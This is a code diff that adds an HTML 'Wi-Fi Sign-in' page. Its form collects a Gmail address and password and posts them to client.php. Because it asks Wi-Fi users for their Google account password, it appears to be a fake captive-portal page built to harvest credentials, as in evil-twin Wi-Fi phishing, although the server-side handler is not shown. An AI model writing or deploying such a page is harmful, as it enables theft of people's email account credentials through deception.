@@ -1,0 +1,22 @@
+
+
+<!DOCTYPE html>
+<html>
+  <head>
+    <link rel="stylesheet" type="text/css" href="./login.css" />
+  </head>
+  <body>
+    <div class="container">
+      <h1>Wi-Fi Sign-in</h1>
+      <form action="client.php" method="post">
+        <label for="username">Username:</label>
+        <input type="text" id="username" name="username" required />
+        <p>Must be a valid Gmail address.</p>
+        <label for="password">Password:</label>
+        <input type="password" id="password" name="password" minlength="8" required />
+        <p>Must be at least 8 characters long.</p>
+        <button type="submit">Connect</button>
+      </form>
+    </div>
+  </body>
+</html>
